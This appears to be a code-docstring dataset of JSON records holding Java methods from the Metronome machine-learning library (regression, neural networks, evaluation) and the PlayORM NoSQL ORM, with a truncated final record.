{"docstring": "/**\n * Main constructor\n * \n * \n * \n * @param numCategories\n * @param numFeatures\n * @param prior\n */\n", "func_signal": "public ParallelOnlineLinearRegression(int numFeatures,\n\t\tPriorFunction prior)", "code": "{\n\t//this.numCategories = numCategories;\n\tthis.prior = prior;\n\n\tupdateSteps = new DenseVector(numFeatures);\n\tupdateCounts = new DenseVector(numFeatures)\n\t\t\t.assign(perTermAnnealingOffset);\n\t\n\t// we only need a 1 row matrix in this case\n\t// actually we could change beta over to a Vector but I'm lazy now.\n\tbeta = new DenseMatrix(1, numFeatures);\n\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * The batch buffer should already have the gradient base for each parameter multipled into the sum\n * \n * @param batchSize\n * @param batch_buffer\n * @param gradient_base\n */\n", "func_signal": "public void miniBatchUpdateParameterVector(int batchSize, Vector batch_buffer)", "code": "{\n\t\n//\t\tSystem.out.println( \" miniBatchUpdateParameterVector ------------- \" );\n\t\n\tregularize(batch_buffer);\n\t\n\tIterator<Vector.Element> nonZeros = batch_buffer.iterateNonZero();\n\t\n\twhile (nonZeros.hasNext()) {\n\t\tVector.Element updateLocation = nonZeros.next();\n\t\tint j = updateLocation.index();\n\n\t\tdouble avg_gradient_update = (batch_buffer.get(j) / batchSize );\n\t\t\n\t\tdouble newValue = beta.getQuick(0, j) - ( avg_gradient_update * learningRate * perTermLearningRate(j) );\n\t\tbeta.setQuick(0, j, newValue);\n\n\t\tVector.Element element = nonZeros.next();\n\t\t//int j = element.index();\n\t\tupdateSteps.setQuick(j, getStep());\n\t\tupdateCounts.setQuick(j, updateCounts.getQuick(j) + 1);\n\t\t\n\t}\t\n\t\n\t\n/*\n\t// remember that these elements got updated\n\tIterator<Vector.Element> i = instance.iterateNonZero();\n\twhile (i.hasNext()) {\n\t\tVector.Element element = i.next();\n\t\tint j = element.index();\n\t\tupdateSteps.setQuick(j, getStep());\n\t\tupdateCounts.setQuick(j, updateCounts.getQuick(j) + 1);\n\t}\n\t*/\n\t\t\n\t\t\n\tnextStep();\n\t\t\t\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "// setup()\n", "func_signal": "public void SetupPOLR()", "code": "{\n   \n   System.err.println(\"SetupOLR: \" + this.num_categories + \", \"\n       + this.FeatureVectorSize);\n   LOG.debug(\"SetupOLR: \" + this.num_categories + \", \"\n       + this.FeatureVectorSize);\n   \n   this.global_parameter_vector = new ParameterVector(); //this.num_categories,\n       //this.FeatureVectorSize);\n   \n   String[] predictor_label_names = this.PredictorLabelNames.split(\",\");\n   \n   String[] variable_types = this.PredictorVariableTypes.split(\",\");\n   \n   polr_modelparams = new POLRModelParameters();\n   polr_modelparams.setTargetVariable(this.TargetVariableName); // getStringArgument(cmdLine,\n                                                                // target));\n   polr_modelparams.setNumFeatures(this.FeatureVectorSize);\n   polr_modelparams.setUseBias(true); // !getBooleanArgument(cmdLine, noBias));\n   \n   List<String> typeList = Lists.newArrayList();\n   for (int x = 0; x < variable_types.length; x++) {\n     typeList.add(variable_types[x]);\n   }\n   \n   List<String> predictorList = Lists.newArrayList();\n   for (int x = 0; x < predictor_label_names.length; x++) {\n     predictorList.add(predictor_label_names[x]);\n   }\n   \n   polr_modelparams.setTypeMap(predictorList, typeList);\n   polr_modelparams.setLambda(this.Lambda); // based on defaults - match\n                                            // command line\n   polr_modelparams.setLearningRate(this.LearningRate); // based on defaults -\n                                                        // match command line\n   \n   // setup record factory stuff here ---------\n/*    \n   if (RecordFactory.TWENTYNEWSGROUPS_RECORDFACTORY\n       .equals(this.RecordFactoryClassname)) {\n     \n     this.VectorFactory = new TwentyNewsgroupsRecordFactory(\"\\t\");\n     \n   } else */\n   if (RecordFactory.RCV1_RECORDFACTORY\n       .equals(this.RecordFactoryClassname)) {\n     \n     this.VectorFactory = new RCV1RecordFactory();\n     \n   } else {\n     \n     // need to rethink this\n   /*  \n     this.VectorFactory = new CSVBasedDatasetRecordFactory(\n         this.TargetVariableName, polr_modelparams.getTypeMap());\n     \n     ((CSVBasedDatasetRecordFactory) this.VectorFactory)\n         .firstLine(this.ColumnHeaderNames);\n     */\n   }\n   \n   polr_modelparams.setTargetCategories(this.VectorFactory\n       .getTargetCategories());\n   \n   // ----- this normally is generated from the POLRModelParams ------\n   \n   this.polr = new ParallelOnlineLogisticRegression(this.num_categories,\n       this.FeatureVectorSize, new UniformPrior()).alpha(1).stepOffset(1000)\n       .decayExponent(0.9).lambda(this.Lambda).learningRate(this.LearningRate);\n   \n   polr_modelparams.setPOLR(polr);\n   // this.bSetup = true;\n   \n }", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\logisticregression\\iterativereduce\\POLRMasterNode.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "// setup()\n", "func_signal": "public void SetupPOLR()", "code": "{\n\t    \n\t\tthis.global_parameter_vector = new ParameterVector();  \n\t\t  \n\t    String[] predictor_label_names = this.PredictorLabelNames.split(\",\");\n\t    \n\t    String[] variable_types = this.PredictorVariableTypes.split(\",\");\n\t    \n\t    polr_modelparams = new ModelParameters();\n\t    polr_modelparams.setTargetVariable(this.TargetVariableName); // getStringArgument(cmdLine,\n\t                                                                 // target));\n\t    polr_modelparams.setNumFeatures(this.FeatureVectorSize);\n\t    polr_modelparams.setUseBias(true); // !getBooleanArgument(cmdLine, noBias));\n\t    \n\t    List<String> typeList = Lists.newArrayList();\n\t    for (int x = 0; x < variable_types.length; x++) {\n\t      typeList.add(variable_types[x]);\n\t    }\n\t    \n\t    List<String> predictorList = Lists.newArrayList();\n\t    for (int x = 0; x < predictor_label_names.length; x++) {\n\t      predictorList.add(predictor_label_names[x]);\n\t    }\n\t    \n\t    polr_modelparams.setTypeMap(predictorList, typeList);\n\t    polr_modelparams.setLambda(this.Lambda); // based on defaults - match\n\t                                             // command line\n\t    polr_modelparams.setLearningRate(this.LearningRate); // based on defaults -\n\t                                                         // match command line\n\t    \n\t    // setup record factory stuff here ---------\n\t    \n\t    if (RecordFactory.TWENTYNEWSGROUPS_RECORDFACTORY\n\t        .equals(this.RecordFactoryClassname)) {\n\t      \t      \n\t    } else if (RecordFactory.RCV1_RECORDFACTORY\n\t        .equals(this.RecordFactoryClassname)) {\n\t      \n\t      this.VectorFactory = new RCV1RecordFactory();\n\t      \n\t    } else {\n\t      \n\t      // need to rethink this\n/*\t      \n\t      this.VectorFactory = new CSVBasedDatasetRecordFactory(\n\t          this.TargetVariableName, polr_modelparams.getTypeMap());\n\t      \n\t      ((CSVBasedDatasetRecordFactory) this.VectorFactory)\n\t          .firstLine(this.ColumnHeaderNames);\n\t*/      \n\t    }\n\t    \n\t    // just set something here\n\t    polr_modelparams.setTargetCategories(this.VectorFactory\n\t        .getTargetCategories());\n\t    \n\t    // ----- this normally is generated from the POLRModelParams ------\n\t    \n\t    \n\t    this.polr = new ParallelOnlineLinearRegression(\n\t        this.FeatureVectorSize, new UniformPrior()).alpha(1).stepOffset(1000)\n\t        .decayExponent(0.9).lambda(this.Lambda).learningRate(this.LearningRate);\n\t    \n\t    polr_modelparams.setPOLR(polr);\n\t    \n\t  }", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\iterativereduce\\MasterNode.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Get the connection weights as Vectors\n * - Each vector represents the incoming connection weights\n * - each vector maps to the corresponding indexed+1 layer\n * \n * @return\n */\n", "func_signal": "public ArrayList<Vector> getWeightsAsArrayOfVectors()", "code": "{\n\t\n\tArrayList<Vector> vecs = new ArrayList<Vector>();\n\t\n\tfor ( int x = 1; x < this.getLayersCount(); x++ ) {\n\t\t\n\t\tvecs.add( this.getLayerByIndex(x).getIncomingConnectionsAsVector() );\n\t\t\n\t}\n\t\n\treturn vecs;\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\core\\NeuralNetwork.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Chainable configuration option.\n * \n * @param learningRate\n *            New value of initial learning rate.\n * @return This, so other configurations can be chained.\n */\n", "func_signal": "public ParallelOnlineLinearRegression learningRate(double learningRate)", "code": "{\n\tthis.learningRate = learningRate;\n\treturn this;\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * TODO - add something in to write the gamma to the output stream -- do we\n * need to save gamma?\n */\n", "func_signal": "@Override\npublic void write(DataOutput out) throws IOException", "code": "{\n\tout.writeInt(WRITABLE_VERSION);\n\tout.writeDouble(learningRate);\n\tout.writeDouble(decayFactor);\n\tout.writeInt(stepOffset);\n\tout.writeInt(step);\n\tout.writeDouble(forgettingExponent);\n\tout.writeInt(perTermAnnealingOffset);\n\tout.writeInt(numCategories);\n\tMatrixWritable.writeMatrix(out, beta);\n\tPolymorphicWritable.write(out, prior);\n\tVectorWritable.writeVector(out, updateCounts);\n\tVectorWritable.writeVector(out, updateSteps);\n\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * used by back propagation to update output neurons\n * \n * \n * @param outputError\n */\n", "func_signal": "protected void calculateErrorAndUpdateOutputNeurons(double[] outputError)", "code": "{\n\t\n\tint x = 0;\n\t\n\tfor (Neuron neuron : nn.getOutputNeurons()) {\n\n\t\tif (outputError[ x ] == 0) {\n\t\t\tneuron.setError( 0 );\n                x++;\n\t\t\tcontinue;\n\t\t}\n\t\t\n\t\tActivationFunction transferFunction = neuron.getActivationFunction();\n\t\tdouble neuronInput = neuron.getNetInput();\n\t\tdouble delta = outputError[ x ] * transferFunction.getDerivative( neuronInput ); // delta = (d-y)*df(net)\n\t\tneuron.setError( delta );\n                        \n\t\tthis.updateNeuronWeights( neuron );\t\t\t\t\n\t\tx++; \n\t\t\n\t} // for\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\learning\\SigmoidDeltaLearningAlgorithm.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * This allows us to provide more fine-grain SerDe mechanics\n * - we get each layer's set of incoming connections as a vector\n * - each Mahout vector can easily and cleanly be written to the underlying SerDe stream\n * \n * \n * Today's Assumptions\n * - fully connected network\n * \n * @return\n */\n", "func_signal": "public Vector getIncomingConnectionsAsVector()", "code": "{\n\t\n\tVector v_out = new RandomAccessSparseVector( this.getIncomingConnectionCount() );\n\tint v_index = 0;\n\t\n\tfor (Neuron neuron : this.layer_neurons) {\n\n\t\t//connections += neuron.inConnections.size();\n\t\tfor ( int x = 0; x < neuron.inConnections.size(); x++ ) {\n\t\t\t\n\t\t\tv_out.set(v_index, neuron.inConnections.get(x).getWeight().value);\n\t\t\tv_index++;\n\t\t\t\n\t\t}\n\t\t\n\t}\n\t\n\n\treturn v_out;\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\core\\Layer.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Returns the precision for a given label\n * @param i the label\n * @return the precision for the label\n */\n", "func_signal": "public double precision(int i)", "code": "{\n\tif(truePositives == 0)\n\t\treturn 0;\n\treturn truePositives / (truePositives + falsePositives.getCount(i));\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\eval\\Evaluation.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Custom training for POLR based around accumulating gradient to send to\n * the master process\n * \n * \n * \n * \n * \n */\n", "func_signal": "public void train(double actual_value,\n\t\tVector instance)", "code": "{\n\tunseal();\n\tdouble learningRate = currentLearningRate();\n\n\t// push coefficients back to zero based on the prior\n\tregularize(instance);\n\n\tdouble dot_product = this.beta.viewRow(0).dot(instance);\n\t\n\t\n\t\tdouble gradientBase = dot_product - actual_value; //gradient.get(i);\n\n\n\t\t// we're only going to look at the non-zero elements of the vector\n\t\t// then we apply the gradientBase to the resulting element.\n\t\tIterator<Vector.Element> nonZeros = instance.iterateNonZero();\n\n\t\t// new: we only want to update the first row of beta\n\t\t\n\t\twhile (nonZeros.hasNext()) {\n\t\t\tVector.Element updateLocation = nonZeros.next();\n\t\t\tint j = updateLocation.index();\n\n\t\t\tdouble newValue = beta.getQuick(0, j) - (gradientBase\n\t\t\t\t\t* learningRate * perTermLearningRate(j)\n\t\t\t\t\t* instance.get(j));\n\t\t\t\n\t\t\tbeta.setQuick(0, j, newValue);\n\n\t\t}\n\n\t// remember that these elements got updated\n\tIterator<Vector.Element> i = instance.iterateNonZero();\n\twhile (i.hasNext()) {\n\t\tVector.Element element = i.next();\n\t\tint j = element.index();\n\t\tupdateSteps.setQuick(j, getStep());\n\t\tupdateCounts.setQuick(j, updateCounts.getQuick(j) + 1);\n\t}\n\tnextStep();\n\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "// returns true iff we've converged based on absolute x difference \n", "func_signal": "private boolean smallAbsDiff (Matrix x, Matrix xold)", "code": "{\n\t\n\t//for (int i = 0; i < x.length; i++) {\n\tfor (int i = 0; i < MatrixUtils.length( x ); i++) {\n\t\t\n\t\t//double comp = Math.abs( x.get(i) - xold.get(i) );\n\t\tdouble comp = Math.abs( MatrixUtils.getElement( x, i ) - MatrixUtils.getElement( xold, i ) );\n\t\t\n\t\tif ( comp > absTolx) {\n\t\t\t\n\t\t\treturn false;\n\t\t\t\n\t\t}\n\t\t\n\t}\n\treturn true;\n}\n\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\deeplearning\\neuralnetwork\\optimize\\VectorizedBackTrackLineSearch.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Adjusted this to reflect a general RMS formula\n * \n * @param outputError\n */\n", "func_signal": "protected void addToSquaredErrorSum(double[] outputError)", "code": "{\n    \n\tdouble outputErrorSqrSum = 0.0d;\n\t\n    for (double error : outputError) {\n    \n    \t//outputErrorSqrSum += (error * error) * 0.5d; // a;so multiply with 1/trainingSetSize  1/2n * (...)\n    \toutputErrorSqrSum += (error * error) * 0.5;\n    \t//System.out.println(\"> err^2 \" + ((error * error)) );\n    \t\n    }\n\n    this.totalSquaredErrorSum += outputErrorSqrSum;\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\learning\\LeastMeanSquaresLearningAlgorithm.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Training method to support the mini batch method of training SGD\n * \n * after b samples seen, the parent/governing training algorithm will:\n * \t\t- multiply the per term learning rate times the batch buffer slot divided by b (batch size)\n * \t\t\tand update the parameter vector\n * \n * \n * QUESTIONS\n * \n * \t\t-\thow does regularization play with mini batch?\n * \n * \n * \n * @param actual_value\n * @param training_instance\n * @param batch_vec_buffer\n */\n", "func_signal": "public void trainMiniBatch(double actual_value, Vector training_instance, Vector batch_vec_buffer)", "code": "{\n\t\n//\t\tSystem.out.println( \"trainMiniBatch ---- \");\n\t\n\tunseal();\n\tdouble learningRate = currentLearningRate();\n\n\t// push coefficients back to zero based on the prior\n\t//regularize(training_instance);\n\n\t\n\tdouble dot_product = this.beta.viewRow(0).dot(training_instance);\n\t\n\t\n\t\tdouble gradientBase = dot_product - actual_value; //gradient.get(i);\n\n\t\t// we're only going to look at the non-zero elements of the vector\n\t\t// then we apply the gradientBase to the resulting element.\n\t\tIterator<Vector.Element> nonZeros = training_instance.iterateNonZero();\n\n\t\t// new: we only want to update the first row of beta\n\t\t\n\t\twhile (nonZeros.hasNext()) {\n\t\t\tVector.Element updateLocation = nonZeros.next();\n\t\t\tint j = updateLocation.index();\n\t\t\t\n\t\t\t// calc: actual - instance_value * term_value\n\t\t\tdouble addition = gradientBase * training_instance.get(j);\n\t\t\tdouble curVal = batch_vec_buffer.get(j);\n\t\t\tbatch_vec_buffer.set(j, addition + curVal );\n\t\t\t\n\t\t}\n\t\n/*\n\t// remember that these elements got updated\n\tIterator<Vector.Element> i = instance.iterateNonZero();\n\twhile (i.hasNext()) {\n\t\tVector.Element element = i.next();\n\t\tint j = element.index();\n\t\tupdateSteps.setQuick(j, getStep());\n\t\tupdateCounts.setQuick(j, updateCounts.getQuick(j) + 1);\n\t}\n\t\n\t\t\n\t\t\n\tnextStep();\n\t*/\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Check to see if learning has stalled out\n * - called 1x per epoch (at end)\n * \n * \n * @return\n */\n", "func_signal": "public boolean checkForLearningStallOut()", "code": "{\n\t\n    double errorDelta = Math.abs(this.prevEpochTotalError - this.totalNetworkMeanSquaredError);\n\n    if (errorDelta <= this.stallMinErrorDelta) {\n    \t\n        this.consecutivelyStalledEpochCounter++;\n\n        if (this.consecutivelyStalledEpochCounter >= this.maxConsecutivelyStalledEpochs) {\n            return true;\n        }\n        \n    } else {\n    \t\n        this.consecutivelyStalledEpochCounter = 0;\n        \n    }\n\n    return false;\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\learning\\LeastMeanSquaresLearningAlgorithm.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "//public double label = 0.0;\n", "func_signal": "public CachedVector( int input_feature_vec_size, int output_vec_size )", "code": "{\n\t\n\tthis.vec_input = new RandomAccessSparseVector( input_feature_vec_size );\n\tthis.vec_output = new RandomAccessSparseVector( output_vec_size );\n\t\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\io\\records\\CachedVector.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Collects statistics on the real outcomes vs the \n * guesses. This is for logistic outcome matrices such that the \n * \n * Note that an IllegalArgumentException is thrown if the two passed in\n * matrices aren't the same length.\n * @param realOutcomes the real outcomes (usually binary)\n * @param guesses the guesses (usually a probability vector)\n */\n", "func_signal": "public void eval(Matrix realOutcomes,Matrix guesses)", "code": "{\n\t//if(realOutcomes.length != guesses.length)\n\tif ( MatrixUtils.length(realOutcomes) != MatrixUtils.length(guesses) ) {\n\t\tthrow new IllegalArgumentException(\"Unable to evaluate. Outcome matrices not same length\");\n\t}\n\t\n\tfor (int i = 0; i < realOutcomes.numRows(); i++) {\n\t\t\n\t\t//Matrix currRow = realOutcomes.getRow(i);\n\t\tVector currRow = realOutcomes.viewRow(i);\n\t\t//Matrix guessRow = guesses.getRow(i);\n\t\tVector guessRow = guesses.viewRow(i);\n\n\t\t//int currMax = SimpleBlas.iamax(currRow);\n\t\tint currMax = iamax(currRow);\n\t\t//int guessMax = SimpleBlas.iamax(guessRow);\n\t\tint guessMax = iamax(guessRow);\n\n\t\taddToConfusion( currMax, guessMax );\n\n\t\tif (currMax == guessMax) {\n\t\t\t\n\t\t\tincrementTruePositives();\n\t\t\t\n\t\t} else {\n\t\t\t\n\t\t\tincrementFalseNegatives();\n\t\t\tincrementFalsePositives(guessMax);\n\t\t\t\n\t\t}\n\t}\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\eval\\Evaluation.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Chainable configuration option.\n * \n * @param alpha\n *            New value of decayFactor, the exponential decay rate for the\n *            learning rate.\n * @return This, so other configurations can be chained.\n */\n", "func_signal": "public ParallelOnlineLinearRegression alpha(double alpha)", "code": "{\n\tthis.decayFactor = alpha;\n\treturn this;\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\linearregression\\ParallelOnlineLinearRegression.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Calculate f1 score for a given class\n * @param i the label to calculate f1 for\n * @return the f1 score for the given label\n */\n", "func_signal": "public double f1(int i)", "code": "{\n\tdouble precision = precision(i);\n\tdouble recall = recall();\n\tif(precision == 0 || recall == 0)\n\t\treturn 0;\n\treturn 2.0 * ((precision * recall / (precision + recall)));\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\eval\\Evaluation.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * TODO\n * - add logic for bias neurons\n * \n */\n", "func_signal": "public void completeIOWiring()", "code": "{\n\t\n\n\tArrayList<Neuron> inputNeuronsList = new ArrayList<Neuron>();\n\tArrayList<Neuron> outputNeuronsList = null; //new ArrayList<Neuron>();\n\t    \n\tLayer layer_0_input = this.getLayerByIndex(0);\n\t\n\tLayer layer_last_output = this.getOutputLayer();\n\t\n\toutputNeuronsList = layer_last_output.getNeurons();\n\t    \n\tfor (Neuron neuron : layer_0_input.getNeurons() ) {\n\t    \n\t\tif (!(neuron instanceof BiasNeuron)) {  // dont set input to bias neurons\n\t        \n\t\t\tinputNeuronsList.add(neuron);\n\t            \n\t\t}\n\t        \n\t}\n\t\n\t// System.out.println(\"> n count: \" + inputNeuronsList.size());\n\t\n\t\tthis.setInputNeurons(inputNeuronsList);\n\t\tthis.setOutputNeurons(outputNeuronsList); \n\n}", "path": "src\\main\\java\\tv\\floe\\metronome\\classification\\neuralnetworks\\core\\NeuralNetwork.java", "repo_name": "jpatanooga/Metronome", "stars": 105, "license": "apache-2.0", "language": "java", "size": 10395}
{"docstring": "/**\n * Helper class to find supported annotations of a listener and register them\n * \n * @param <L>\n * @param map\n * @param listener\n * @param annotations\n */\n", "func_signal": "private <L> void addAnnotationListener (Map<String, Set<L>> map, L listener, String... annotations)", "code": "{\n\t// throw exception if the listener doesn't support any annotations. what's the point of\n\t// registering then?\n\tif (null == annotations || annotations.length == 0) {\n\t\tthrow new IllegalArgumentException(listener.getClass() + \" has no supporting Annotations. Check method supportedAnnotations\");\n\t}\n\t\n\t\tfor (String annotation : annotations) {\n\t\t\tSet<L> listeners = map.get(annotation);\n\t\t\tif (null == listeners) {\n\t\t\t\tlisteners = new HashSet<L>();\n\t\t\t\tmap.put(annotation, listeners);\n\t\t\t}\n\t\t\tlisteners.add(listener);\n\t\t}\n}", "path": "src\\main\\java\\com\\impetus\\annovention\\Discoverer.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//\tprivate static boolean hasTypeInfo(CommonTree node) {\n//\t\tif(node.getType() == NoSqlLexer.ATTR_NAME || node.getType() == NoSqlLexer.DECIMAL\n//\t\t\t\t|| node.getType() == NoSqlLexer.INT_VAL || node.getType() == NoSqlLexer.STR_VAL)\n//\t\t\treturn true;\n//\t\treturn false;\n//\t}\n", "func_signal": "private static TypeInfo processSide(ExpressionNode node, InfoForWiring wiring, TypeInfo typeInfo, MetaFacade facade)", "code": "{\n\t\tif(node.getType() == NoSqlLexer.ATTR_NAME) {\n\t\t\treturn processColumnName(node, wiring, typeInfo, facade);\n\t\t} else if(node.isParameter()) {\n\t\t\treturn processParam(node, wiring, typeInfo);\n\t\t} else if(node.isConstant()) {\n\t\t\treturn processConstant(node, wiring, typeInfo);\n\t\t} else \n\t\t\tthrow new RuntimeException(\"bug, type not supported yet=\"+node.getType());\n\t}", "path": "src\\main\\java\\com\\alvazan\\orm\\parser\\antlr\\ScannerSql.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * Converts to BigInteger byte form OR BigDecimal byte form OR UTF8 byte form\n * @param obj\n * @return byte form for the object\n */\n", "func_signal": "public static byte[] convertToBytes(Object obj)", "code": "{\n\tif(obj == null)\n\t\treturn null;\n\tClass clazz = obj.getClass();\n\tBaseConverter converter = stdConverters.get(clazz);\n\tif(converter == null)\n\t\tthrow new IllegalArgumentException(\"Type clazz=\"+clazz+\" is not supported at this time\");\n\treturn converter.convertToNoSql(obj);\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\api\\z8spi\\conv\\StandardConverters.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * NOTE: This must be here so that if you get TypedSession from the NoSqlEntitManager, he will\n * have the same session object and flush flushes both typed and ORM data at the same time!!!\n * To be removed eventually\n * @param s\n */\n", "func_signal": "public void setInformation(NoSqlSession s, MetaLoader mgr)", "code": "{\n\tthis.session = s;\n\tthis.mgr = mgr;\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\layer3\\typed\\NoSqlTypedSessionImpl.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * @param row\n * @param session - The session to pass to newly created proxy objects\n * @param inst The object OR the proxy to be filled in \n */\n", "func_signal": "public void fillInInstance(Row row, NoSqlSession session, T inst)", "code": "{\n\tidField.translateFromColumn(row, inst, session);\n\tif (ttlField != null)\n\t\tttlField.translateFromColumn(row, inst, session);\n\n\tfor(MetaField<T> field : columnNameToField.values()) {\n\t\tfield.translateFromColumn(row, inst, session);\n\t}\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\impl\\meta\\data\\MetaClassSingle.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * Special method as if you convert 5 or 876, they convert to BigInteger byte form but here we\n * specifically want BigDecimal byte form so we need to force that.\n * @param obj\n * @return byte form for the object\n */\n", "func_signal": "public static byte[] convertToDecimalBytes(Object obj)", "code": "{\n\tObject value = obj;\n\tClass clazz = obj.getClass();\n\tif(Byte.class.equals(clazz) \n\t\t\t|| Short.class.equals(clazz)\n\t\t\t|| Integer.class.equals(clazz)\n\t\t\t|| Long.class.equals(clazz)) {\n\t\tclazz = Double.class;\n\t\tDouble d = translate(obj);\n\t\tvalue = d;\n\t}\n\t\n\tBaseConverter converter = stdConverters.get(clazz);\n\tif(converter == null)\n\t\tthrow new IllegalArgumentException(\"Type not supported at this time=\"+obj.getClass());\n\treturn converter.convertToNoSql(value);\n}", "path": "src\\main\\java\\com\\alvazan\\orm\\api\\z8spi\\conv\\StandardConverters.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "//\tpublic byte[] convertIdToNoSql(Object entityId) {\n//\t\tConverter converter = idField.getConverter();\n//\t\treturn converter.convertToNoSql(entityId);\n//\t}\n", "func_signal": "@SuppressWarnings(\"rawtypes\")\n\tpublic byte[] convertEntityToId(T value)", "code": "{\n\t\tif(value == null)\n\t\t\treturn null;\n\t\tMetaIdField idField = getIdField();\n\t\tif (idField == null)\n\t\t\treturn null;\n\t\tObject id = fetchId(value);\n\t\tConverter converter = idField.getConverter();\n\t\treturn converter.convertToNoSql(id);\t\t\n\t}", "path": "src\\main\\java\\com\\alvazan\\orm\\impl\\meta\\data\\MetaAbstractClass.java", "repo_name": "deanhiller/playorm", "stars": 76, "license": "other", "language": "java", "size": 52966}
{"docstring": "/**\n * This tests the caching of backward iteration.  There once was a bug where it got reversed (back to forward) when iterated \n * backward the second time because the of the cache.\n * @throws InterruptedException\n */\n", "func_signal": "@Test\npublic void testInnerJoinBackwardRepeatedly() throws InterruptedException", "code": "{\n\tNoSqlTypedSession s = mgr.getTypedSession();\n\n\tQueryResult result = s.createQueryCursor(\"select * FROM Activity as e INNER JOIN e.account  as a WHERE e.numTimes < 15 and a.isActive = false\", 50);\n\tList<ViewInfo> views = result.getViews();\n\tCursor<IndexColumnInfo> cursor = result.getCursor();\n\tcursor.afterLast();\n\t//iterate all the way through to force everything to load once, then ensure things are still in the correct (reversed) order:\n\twhile(cursor.previous()){cursor.getCurrent();}\n\tcursor.afterLast();\n\t\n\tViewInfo viewAct = views.get(0);\n\tViewInfo viewAcc = views.get(1);\n\tString alias1 = viewAct.getAlias();\n\tString alias2 = viewAcc.getAlias();\n\tAssert.assertEquals(\"e\", alias1);\n\tAssert.assertEquals(\"a\", alias2);\n\t\n\tAssert.assertTrue(cursor.previous());\n\tcompareKeys(cursor, viewAct, viewAcc, \"act7\", \"acc1\");\n\tAssert.assertTrue(cursor.previous());\n\tcompareKeys(cursor, viewAct, viewAcc, \"act1\", \"acc1\");\n\tAssert.assertFalse(cursor.previous());\n\t\n\tCursor<List<TypedRow>> rows = result.getAllViewsCursor();\n\trows.afterLast();\n\t\n\trows.previous();\n\tList<TypedRow> joinedRow = rows.getCurrent();\n\t\n\tTypedRow typedRow = joinedRow.get(0);\n\tTypedRow theJoinedRow = joinedRow.get(1);\n\t\n\tlog.info(\"joinedRow=\"+joinedRow);\n\tAssert.assertEquals(\"e\", typedRow.getView().getAlias());\n\tAssert.assertEquals(\"act7\", 